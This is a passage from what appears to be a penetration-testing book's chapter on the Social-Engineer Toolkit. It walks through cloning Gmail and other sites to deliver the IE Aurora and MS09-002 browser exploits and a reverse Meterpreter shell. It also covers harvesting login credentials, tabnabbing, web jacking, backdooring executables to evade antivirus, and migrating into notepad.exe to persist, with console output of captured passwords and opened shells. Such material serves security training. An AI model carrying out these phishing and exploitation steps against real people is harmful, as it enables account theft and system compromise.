C:\Documents and Settings\Administrator\Desktop&gt;</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="client-side_web_exploits">Client-Side Web Exploits</h3></div></div></div><p class="calibre2">SET can also use client-side web exploits. In this case, instead of a Java applet being presented to the target, a client-side exploit imported directly from Metasploit is used to attack the system. To use client-side exploits, you must rely on your prior reconnaissance or hope that the user is susceptible to a specific vulnerability. This method is particularly satisfying if a zero-day vulnerability is discovered: As soon as an exploit is released from Metasploit, it is typically tested and published through SET within the hour.<a id="IDX-CHP-10-0048" class="strong"/><a id="IDX-CHP-10-0049" class="strong"/><a id="IDX-CHP-10-0050" class="strong"/></p><p class="calibre2">In this example, we will repeat the previous scenario, but we’ll use a client-side attack. Client-side attacks specifically target (mostly) browser flaws. Most exploits in SET target Internet Explorer; however, Firefox exploits are also used. In this scenario, we’ll use the Aurora attack vector that was used to compromise Google. To begin, do the following:<a id="IDX-CHP-10-0051" class="strong"/></p><a id="I_programlisting10_d1e12049" class="strong"/><pre class="programlisting">root@bt:/pentest/exploits/set# <strong class="calibre3"><code class="calibre6">./set</code></strong>

  Select from the menu:

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 2.  Website Attack Vectors
  Enter your choice: <strong class="calibre3"><code class="calibre6">2</code></strong>

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 2. The Metasploit Browser Exploit Method

  Enter your choice (press enter for default): <strong class="calibre3"><code class="calibre6">2</code></strong>

  [!] Website Attack Vectors [!]

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> 2. Site Cloner

  Enter number (1-4): <strong class="calibre3"><code class="calibre6">2</code></strong>

  SET supports both HTTP and HTTPS
  Example: http://www.thisisafakesite.com
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> Enter the url to clone: <strong class="calibre3"><code class="calibre6">http://www.secmaniac.com</code></strong></pre><p class="calibre2">Select <code class="literal">Website Attack Vectors</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12095" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> from the SET main menu, and then select <code class="literal">The Metasploit Browser Exploit Method</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12104" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Then select the <code class="literal">Site Cloner</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12114" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> option, and enter <a class="xref" href="http://www.secmaniac.com" target="_top">http://www.secmaniac.com</a> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12122" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> as the website you want to use for cloning.<a id="IDX-CHP-10-0052" class="strong"/><a id="IDX-CHP-10-0053" class="strong"/><a id="IDX-CHP-10-0054" class="strong"/></p><p class="calibre2">Once the site is cloned, we’ll set up the exploit to trigger when a target browses the site.</p><a id="I_programlisting10_d1e12139" class="strong"/><pre class="programlisting">Enter the browser exploit you would like to use

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 16. Microsoft Internet Explorer "Aurora"

  Enter your choice (1-23) (enter for default): <strong class="calibre3"><code class="calibre6">16</code></strong>
  What payload do you want to generate:

  Name:                                      Description:

  2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter
 shell on victim and send
                                                 back to attacker.

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter choice (example 1-10) (Enter for default):
  Enter the port to use for the reverse (enter for default):

  [*] Cloning the website: http://www.secmaniac.com
  [*] This could take a little bit...
  [*] Injecting iframes into cloned website for MSF Attack....
  [*] Malicious iframe injection successful...crafting payload.
  [*] Launching MSF Listener...
  [*] This may take a few to load MSF...

  resource (src/program_junk/meta_config)&gt; exploit -j
  [*] Exploit running as background job.
  msf exploit(ms10_002_aurora) &gt;
  [*] Started reverse handler on 10.10.1.112:443
  [*] Using URL: http://0.0.0.0:8080/
  [*]  Local IP: http:// 10.10.1.112:8080/
  [*] Server started.</pre><p class="calibre2">To complete the attack setup, select the client-side exploit you wish to use. Above, we choose the infamous Internet Explorer Aurora exploit <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12158" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and accept the default reverse Meterpreter payload by pressing <span class="keycap">enter</span> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12167" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>.<a id="IDX-CHP-10-0055" class="strong"/></p><p class="calibre2">When the target reaches <a class="xref" href="http://www.secmaniac.com/" target="_top">http://www.secmaniac.com/</a>, the site looks normal, but his system is compromised through an <span class="strong"><em class="calibre4">iframe injection</em></span>. SET automatically rewrites the site to contain the iframe that houses the Metasploit client-side attack.<a id="IDX-CHP-10-0056" class="strong"/></p><p class="calibre2">Back at the attacking machine, we see that the attack is successful. The Meterpreter session has established the connection from the target to the attacking machine, and we have full access to the system, as shown here.</p><a id="I_programlisting10_d1e12188" class="strong"/><pre class="programlisting">msf exploit(handler) &gt;
[*] Sending stage (748032 bytes) to 10.10.1.102
[*] Meterpreter session 1 opened (10.10.1.112:443 -&gt; 10.10.1.102:58412)

msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong>
[*] Starting interaction with 1...

shellmeterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong>
Process 2819 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop&gt;</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="username_and_password_harvesting">Username and Password Harvesting</h3></div></div></div><p class="calibre2">In the preceding examples, the goal was to obtain access to the individual system. Relatively new within SET is the ability to clone a website and harvest visitors’ credentials when they access the site, as we’ll demonstrate using Gmail in this next example. SET can create a clone of the Gmail website and then automatically rewrite the POST parameters of that website to post to the SET web server and then redirect the user to the legitimately cloned website.<a id="IDX-CHP-10-0057" class="strong"/><a id="IDX-CHP-10-0058" class="strong"/><a id="IDX-CHP-10-0059" class="strong"/><a id="IDX-CHP-10-0060" class="strong"/><a id="IDX-CHP-10-0061" class="strong"/><a id="IDX-CHP-10-0062" class="strong"/><a id="IDX-CHP-10-0063" class="strong"/></p><a id="I_programlisting10_d1e12230" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 3. Credential Harvester Attack Method

  Enter your choice (press enter for default): <strong class="calibre3"><code class="calibre6">3</code></strong>

  [!] Website Attack Vectors [!]

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 2. Site Cloner

  Enter number (1-4): <strong class="calibre3"><code class="calibre6">2</code></strong>

  Email harvester will allow you to utilize the clone capabilities within SET
  to harvest credentials or parameters from a website as well as place them into
  a report.

  SET supports both HTTP and HTTPS
  Example: http://www.thisisafakesite.com
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Enter the url to clone: <strong class="calibre3"><code class="calibre6">http://www.secmaniac.com</code></strong>

  Press {return} to continue.
  [*] Social-Engineer Toolkit Credential Harvester Attack
  [*] Credential Harvester is running on port 80
  [*] Information will be displayed to you as it arrives below:</pre><p class="calibre2">After you select <code class="literal">Website Attack Vectors</code> and the <code class="literal">Credential Harvester</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12266" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, choose <code class="literal">Site Cloner</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12275" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. The configuration for this attack is minimal and requires only that you pass a URL (<a class="xref" href="http://www.secmaniac.com" target="_top">http://www.secmaniac.com</a>) <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12284" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> to SET that contains a login form.<a id="IDX-CHP-10-0064" class="strong"/><a id="IDX-CHP-10-0065" class="strong"/><a id="IDX-CHP-10-0066" class="strong"/><a id="IDX-CHP-10-0067" class="strong"/></p><p class="calibre2">The web server runs and waits for the target’s response. As mentioned previously, you could in this instance set <code class="literal">WEBATTACK_CONFIG=ON</code>, and SET would prompt you to attempt mass emails to coax targets into clicking the link. The target would be presented with a web page that looks identical to Gmail’s website and initial login page. When the target enters his password, the browser automatically redirects to the original Gmail website, while the following information is presented to the attacker:</p><a id="I_programlisting10_d1e12307" class="strong"/><pre class="programlisting">10.10.1.102 - - "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: ltmpl=default
PARAM: ltmplcache=2
PARAM: continue=https://mail.google.com/mail/?
PARAM: service=mail
PARAM: rm=false
PARAM: dsh=-1174166214807618980
PARAM: ltmpl=default
PARAM: ltmpl=default
PARAM: scc=1
PARAM: ss=1
PARAM: GALX=S3ftXFIww0E
<strong class="calibre3"><code class="calibre6">POSSIBLE USERNAME FIELD FOUND: Email=ihazomgsecurity2390239203</code></strong>
<strong class="calibre3"><code class="calibre6">POSSIBLE PASSWORD FIELD FOUND: Passwd=thisisacomplexp@55w0rd!!!!!</code></strong>
PARAM: rmShown=1
PARAM: signIn=Sign+in
PARAM: asts=
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</pre><p class="calibre2">SET uses a built-in dictionary to mark form fields and parameters on sites that might contain sensitive information. It red-highlights potential username and password parameters to indicate that they could be sensitive parameters that are worth investigating.</p><p class="calibre2">Once you’ve finished harvesting all of the target’s credentials, press c<span class="keycap">trl-</span>C to generate a report, as shown in <a class="xref" href="part0014.html#credential_harvester_report">Figure 10-3</a>. The report uses XML and HTML formatting.</p><p class="calibre2">SET’s web server is multithreaded and can handle as many requests as your server can handle. When a number of targets enter their credentials into the site, SET will automatically parse those results into a report format that separates the form fields in a readable format.</p><p class="calibre2">You can also export the credential harvesting results in an XML-compliant format to later import into tools or parsers that you’re already using.<a id="IDX-CHP-10-0068" class="strong"/></p><div class="figure"><a id="credential_harvester_report" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e12334" class="strong"/><img src="../images/00041.jpeg" alt="Credential harvester report" hisrc="httpatomoreillycomsourcenostarchimages867536.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-3. Credential harvester report</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="tabnabbing">Tabnabbing</h3></div></div></div><p class="calibre2">In a <span class="strong"><em class="calibre4">tabnabbing</em></span> scenario, a target is caught while accessing a website with multiple tabs open. When the target clicks a link, he is presented with a “Please wait while the page loads” message. When the target switches tabs, the website detects that a different tab has focus and rewrites the web page that presented the “Please wait . . . ” message with a website you specify.<a id="IDX-CHP-10-0069" class="strong"/><a id="IDX-CHP-10-0070" class="strong"/><a id="IDX-CHP-10-0071" class="strong"/><a id="IDX-CHP-10-0072" class="strong"/><a id="IDX-CHP-10-0073" class="strong"/></p><p class="calibre2">Eventually, the target clicks the tabnabbed tab, and, believing he is being asked to sign in to his email program or business application, he enters his credentials into the malicious look-alike site. The credentials are harvested, and the target is redirected to the original website. You can access the tab-nabbing attack vector through SET’s web attack vector interface.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="man-left-in-the-middle">Man-Left-in-the-Middle</h3></div></div></div><p class="calibre2">A <span class="strong"><em class="calibre4">man-left-in-the-middle</em></span> attack uses HTTP referers on an already compromised site or a cross-site scripting (XSS) vulnerability to pass the target’s credentials back to the HTTP server. If you find an XSS vulnerability and send the URL to the target, who then clicks the link, the website will operate normally, but when the target logs into the system, his credentials are passed to the attacker. The man-left-in-the-middle attack vector can be accessed through SET’s web attack vector interface.<a id="IDX-CHP-10-0074" class="strong"/><a id="IDX-CHP-10-0075" class="strong"/><a id="IDX-CHP-10-0076" class="strong"/><a id="IDX-CHP-10-0077" class="strong"/><a id="IDX-CHP-10-0078" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="web_jacking">Web Jacking</h3></div></div></div><p class="calibre2">The <span class="strong"><em class="calibre4">web jacking</em></span> attack method, new in SET version 0.7, allows you to create a website clone, where the target is presented with a link stating that the website has moved. When the target hovers over the link, the URL presented is the real URL, not the attacker’s URL. So, for example, if you’re cloning <a class="xref" href="https://gmail.com/" target="_top">https://gmail.com/</a>, the URL that would appear on the target’s machine when he hovers his mouse over the link would be <a class="xref" href="https://gmail.com/" target="_top">https://gmail.com/</a>. When the target clicks the link, Gmail opens but is quickly replaced with your malicious web server.<a id="IDX-CHP-10-0079" class="strong"/><a id="IDX-CHP-10-0080" class="strong"/></p><p class="calibre2">This attack uses a time-based iframe replacement. When the target hovers over the link, it points to whatever site you cloned. When the target clicks the link, the iframe replacement will initiate and replace the target’s browser with the malicious cloned site without the target’s knowledge. You can change the timing of a web jacking attack using the <code class="literal">config/set_config</code> flags.<a id="IDX-CHP-10-0081" class="strong"/><a id="IDX-CHP-10-0082" class="strong"/><a id="IDX-CHP-10-0083" class="strong"/><a id="IDX-CHP-10-0084" class="strong"/><a id="IDX-CHP-10-0085" class="strong"/></p><p class="calibre2">To configure SET for the attack, select <code class="literal">Web Jacking Attack Method</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12450" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and <code class="literal">Site Cloner</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12459" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, and then add the site you want to clone, <a class="xref" href="https://gmail.com" target="_top">https://gmail.com</a> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12468" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, as shown below.</p><a id="I_programlisting10_d1e12474" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 6. Web Jacking Attack Method

  Enter your choice (press enter for default): <strong class="calibre3"><code class="calibre6">6</code></strong>

  [!] Website Attack Vectors [!]

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 2. Site Cloner

  Enter number (1-4): <strong class="calibre3"><code class="calibre6">2</code></strong>

  SET supports both HTTP and HTTPS
  Example: http://www.thisisafakesite.com
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Enter the url to clone: <strong class="calibre3"><code class="calibre6">https://gmail.com</code></strong>

  [*] Cloning the website: https://gmail.com
  [*] This could take a little bit...

  The best way to use this attack is if username and password form
  fields are available. Regardless, this captures all POSTs on a website.
  [*] I have read the above message. [*]

  Press {return} to continue.

  [*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.</pre><p class="calibre2">When the target visits the cloned site, he will see the link shown in <a class="xref" href="part0014.html#initial_page_and_link_to_the_cloned_page">Figure 10-4</a>. Notice that the URL at the lower-left corner shows <a class="xref" href="https://gmail.com/" target="_top">https://gmail.com/</a>.</p><div class="figure"><a id="initial_page_and_link_to_the_cloned_page" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e12511" class="strong"/><img src="../images/00042.jpeg" alt="Initial page and link to the cloned page" hisrc="httpatomoreillycomsourcenostarchimages867538.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-4. Initial page and link to the cloned page</div></div><p class="calibre2">When the target clicks the link, he is presented with the cloned web page shown in <a class="xref" href="part0014.html#cloned_gmail_welcome_page">Figure 10-5</a>, which looks exactly like the real Gmail Welcome page.<a id="IDX-CHP-10-0086" class="strong"/></p><div class="figure"><a id="cloned_gmail_welcome_page" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e12526" class="strong"/><img src="../images/00043.jpeg" alt="Cloned Gmail Welcome page" hisrc="httpatomoreillycomsourcenostarchimages867540.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-5. Cloned Gmail Welcome page</div></div><p class="calibre2">Notice that the URL text at the top of <a class="xref" href="part0014.html#cloned_gmail_welcome_page">Figure 10-5</a> shows our malicious web server. As in preceding examples, you can register a similar domain name to avoid this issue. Once the target enters his username and password in the appropriate fields, you can intercept and harvest the credentials.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="putting_it_all_together_with_a_multipron">Putting It All Together with a Multipronged Attack</h3></div></div></div><p class="calibre2">The multi-attack web vector allows you to chain multiple web attack methods together to perform a single attack. The multi-attack vector allows you to turn on and off different vectors and combine the attacks into one web page. When the user clicks the link, he will be targeted by each of the attack vectors you specify. A multipronged attack is particularly useful because, in some cases, the Java applet might fail, while a client-side Internet Explorer exploit would succeed. Or, the Java applet and the Internet Explorer exploits might fail, but the credential harvester succeeds.<a id="IDX-CHP-10-0087" class="strong"/><a id="IDX-CHP-10-0088" class="strong"/><a id="IDX-CHP-10-0089" class="strong"/><a id="IDX-CHP-10-0090" class="strong"/></p><p class="calibre2">In the following example, we’ll use the Java applet attack, the Metasploit client-side exploit, and the web jacking attack. When the target browses the affected site, he will be enticed to click the link and will then be bombarded with a credential harvester, Metasploit exploits, and the Java applet attack. Here we’ll select an Internet Explorer 7 exploit and browse the target’s machine using Internet Explorer 6 just to demonstrate how if one method fails, others can be used.<a id="IDX-CHP-10-0091" class="strong"/><a id="IDX-CHP-10-0092" class="strong"/><a id="IDX-CHP-10-0093" class="strong"/><a id="IDX-CHP-10-0094" class="strong"/></p><a id="I_programlisting10_d1e12574" class="strong"/><pre class="programlisting">1. The Java Applet Attack Method
  2. The Metasploit Browser Exploit Method
  3. Credential Harvester Attack Method
  4. Tabnabbing Attack Method
  5. Man Left in the Middle Attack Method
  6. Web Jacking Attack Method
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 7. Multi-Attack Web Method
  8. Return to the previous menu

  Enter your choice (press enter for default): <strong class="calibre3"><code class="calibre6">7</code></strong>

  [!] Website Attack Vectors [!]

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 2. Site Cloner

  Enter number (1-4): <strong class="calibre3"><code class="calibre6">2</code></strong>

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Enter the url to clone: <strong class="calibre3"><code class="calibre6">https://gmail.com</code></strong>
  Select which attacks you want to use:

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> 1. The Java Applet Attack Method (OFF)
<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/> 2. The Metasploit Browser Exploit Method (OFF)
  3. Credential Harvester Attack Method (OFF)
  4. Tabnabbing Attack Method (OFF)
  5. Man Left in the Middle Attack Method (OFF)
<img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre7"/> 6. Web Jacking Attack Method (OFF)
  7. Use them all - A.K.A. 'Tactical Nuke'
  8. I'm finished and want to proceed with the attack.
  9. Return to main menu.

  Enter your choice one at a time (hit 8 or enter to launch): <strong class="calibre3"><code class="calibre6">1</code></strong>

  Turning the Java Applet Attack Vector to ON

  Select which attacks you want to use:


  Enter your choice one at a time (hit 8 or enter to launch): <strong class="calibre3"><code class="calibre6">2</code></strong>

  Turning the Metasploit Client Side Attack Vector to ON

  Option added. Press {return} to add or prepare your next attack.

  Select which attacks you want to use:


  Enter your choice one at a time (hit 8 or enter to launch): <strong class="calibre3"><code class="calibre6">6</code></strong>

  Turning the Web Jacking Attack Vector to ON

  Select which attacks you want to use:

  <strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

  Enter your choice one at a time (hit 8 or enter to launch):</pre><p class="calibre2">Begin configuring the attack by selecting <code class="literal">Multi-Attack Web Method</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12640" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> from the main menu, and then choose <code class="literal">Site Cloner</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12649" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and enter the URL to clone, <a class="xref" href="https://gmail.com" target="_top">https://gmail.com</a> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12658" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. Next, SET presents a menu of different attacks. Select <code class="literal">The Java Applet Attack Method</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12667" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, then <code class="literal">The Metasploit Browser Exploit Method</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12676" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>, and finally, select <code class="literal">Web Jacking Attack Method</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12686" class="strong"/><img src="../images/00026.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867506.png" class="calibre8"/></span>. You could also select option 7, <code class="literal">Use them all - A.K.A. 'Tactical Nuke'</code> to enable all the attack vectors automatically.<a id="IDX-CHP-10-0095" class="strong"/><a id="IDX-CHP-10-0096" class="strong"/><a id="IDX-CHP-10-0097" class="strong"/><a id="IDX-CHP-10-0098" class="strong"/><a id="IDX-CHP-10-0099" class="strong"/><a id="IDX-CHP-10-0100" class="strong"/></p><p class="calibre2">In the preceding example, notice that the flags have changed and that the Java applet, Metasploit browser exploit, credential harvester, and web jacking attack methods have all been enabled. To proceed, press <span class="keycap">enter</span> or choose option 8 (<code class="literal">I'm finished...</code>).</p><a id="I_programlisting10_d1e12721" class="strong"/><pre class="programlisting">Enter your choice one at a time (hit 8 or enter to launch):
  What payload do you want to generate:

  Name:                                      Description:

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
 2. Windows Reverse_TCP Meterpreter         Spawn
 a meterpreter shell on victim and send
  back to attacker.

  Enter choice (hit enter for default):

  Below is a list of encodings to try and bypass AV.

  Select one of the below, 'backdoored executable' is typically the best.

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 16. Backdoored Executable (BEST)

  Enter your choice (enter for default):
  [-] Enter the PORT of the listener (enter for default):

  [-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
  [-] Backdoor completed successfully. Payload is now
 hidden within a legit executable.

  ********************************************************
  Do you want to create a Linux/OSX reverse_tcp payload
  in the Java Applet attack as well?
  ********************************************************

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> Enter choice yes or no: <strong class="calibre3"><code class="calibre6">no</code></strong>

  Enter the browser exploit you would like to use

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> 8. Internet Explorer 7 Uninitialized Memory Corruption (MS09-002)

  Enter your choice (1-12) (enter for default): <strong class="calibre3"><code class="calibre6">8</code></strong>

  [*] Cloning the website: https://gmail.com
  [*] This could take a little bit...
  [*] Injecting Java Applet attack into the newly cloned website.
  [*] Filename obfuscation complete. Payload name is: x5sKAzS
  [*] Malicious java applet website prepped for deployment

  [*] Injecting iframes into cloned website for MSF Attack....
  [*] Malicious iframe injection successful...crafting payload.

  resource (src/program_junk/meta_config)&gt; exploit -j
  [*] Exploit running as background job.
  msf exploit(ms09_002_memory_corruption) &gt;
  [*] Started reverse handler on 172.16.32.129:443
  [*] Using URL: http://0.0.0.0:8080/
  [*] Local IP: http://172.16.32.129:8080/
  [*] Server started.</pre><p class="calibre2">To complete the attack setup, select the default reverse Meterpreter payload <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12756" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> along with default encoding and listening port <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12762" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Choose not to configure a Linux and OS X payload <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12768" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, and then set the browser exploit to <code class="literal">Internet Explorer 7 Uninitialized Memory Corruption (MS09-002)</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e12777" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>; then SET will launch the attack.<a id="IDX-CHP-10-0101" class="strong"/><a id="IDX-CHP-10-0102" class="strong"/></p><p class="calibre2">Once everything is running, you can browse to the website and see what’s going on there. A message URL tells you that the site has been moved. Please refer to <a class="xref" href="part0014.html#initial_page_and_link_to_the_cloned_page">Figure 10-4</a> to see what the target will see on his machine.</p><p class="calibre2">Click the link and the Metasploit exploit begins. Here’s the handler on the backend:</p><a id="I_programlisting10_d1e12796" class="strong"/><pre class="programlisting">[*] Sending Internet Explorer 7 CFunctionPointer Uninitialized Memory
     Corruption to 172.16.32.131:1329...</pre><p class="calibre2">This exploit fails, because we are using Internet Explorer 6. The target’s screen is shown in <a class="xref" href="part0014.html#multi-attack_security_warning">Figure 10-6</a>.</p><div class="figure"><a id="multi-attack_security_warning" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e12806" class="strong"/><img src="../images/00044.jpeg" alt="Multi-attack security warning" hisrc="httpatomoreillycomsourcenostarchimages867542.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-6. Multi-attack security warning</div></div><p class="calibre2">We have a backup attack, however. The target clicks Run on the malicious Java applet, a Meterpreter shell begins, and the target is redirected back to the original Gmail page. The attack is successful.<a id="IDX-CHP-10-0103" class="strong"/><a id="IDX-CHP-10-0104" class="strong"/></p><p class="calibre2">Notice that when using the Java applet, we automatically migrate to a separate thread (process) that happens to be <span class="strong"><em class="calibre4">notepad.exe</em></span>. Because of this, if the target closes the browser, our attack will continue because the process won’t terminate our Meterpreter shell. Also, within the configuration file you can set the “Java Repeater” option, which will continue to prompt the target with the Java applet warning even if he clicks Cancel. This makes it more likely that the target will click the Run button.<a id="IDX-CHP-10-0105" class="strong"/></p><p class="calibre2">The Meterpreter shell is presented to us once a successful exploit is performed, as shown below.</p><a id="I_programlisting10_d1e12829" class="strong"/><pre class="programlisting">[*] Sending stage (748544 bytes) to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1333) at
     Thu Sep 09 12:33:20 −0400 2010
[*] Session ID 1 (172.16.32.129:443 -&gt; 172.16.32.131:1333) processing
     InitialAutoRunScript 'migrate -f'
[*] Current server process: java.exe (824)
[*] Spawning a notepad.exe host process...
[*] Migrating into process ID 3044
[*] New server process: notepad.exe (3044)
msf exploit(ms09_002_memory_corruption) &gt;</pre><p class="calibre2">Now let’s say that this attack fails, and the target clicks Cancel (without the repeater option enabled). He would then be prompted to enter his username and password into the username and password fields, allowing you to successfully harvest the credentials on the website and still have a successful attack. While you wouldn’t have a Meterpreter shell, because the target didn’t click Run, you would still be able to intercept the credentials:<a id="IDX-CHP-10-0106" class="strong"/><a id="IDX-CHP-10-0107" class="strong"/><a id="IDX-CHP-10-0108" class="strong"/></p><a id="I_programlisting10_d1e12844" class="strong"/><pre class="programlisting">[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: Email=thisismyusername
POSSIBLE PASSWORD FIELD FOUND: Passwd=thisismypassword
